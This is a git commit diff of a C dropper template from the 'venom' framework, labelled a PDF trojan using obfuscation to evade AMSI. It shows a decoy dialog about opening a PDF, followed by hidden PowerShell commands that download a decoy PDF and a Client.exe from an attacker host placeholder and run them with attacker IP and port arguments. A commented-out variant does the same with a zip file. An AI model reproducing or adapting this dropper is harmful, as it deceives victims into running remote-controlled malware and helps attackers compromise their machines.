95f87354d1033422c19040b60c6708b1c0e7a93f
root <root@localhost.localdomain>
2020-09-22 05:57:26 +0100

    venom v1.0.17.4 - PDF Trojan (PreProcessor C Obfuscation)

--- templates/dropper.c
+++ templates/dropper.c
@@ -1,6 +1,7 @@
 /*
 Author: r00t-3xp10it (SSA RedTeam @2020)
-Framework: Venom v1.0.17 - Amsi Evasion - Agent nº 5
+Framework: Venom v1.0.17.4 - Amsi Evasion - Agent nº5
+Description: C PreProcessor (macro) system API's obfuscation.
 */
 
 #include<stdio.h>
@@ -12,8 +13,9 @@ Framework: Venom v1.0.17 - Amsi Evasion - Agent nº 5
 
 int main()
 {
-    MessageBox(NULL, "Download PDF document?", "FiLNaMe.pdf", MB_OK);
+    MessageBox(NULL, "Open Archive with PDF Reader?", "Portable Document Format (PDF)", MB_OK);
    _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'TempDir\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");Sleep(1);
-   _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
+   _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -windowstyle minimized -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
+/* _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.zip', 'TempDir\\Client.zip') && cd TempDir && unzip Client.zip && cmd /R start /min Client.exe ip=LhOsT port=LpOrT"); */
    return 0;
 }
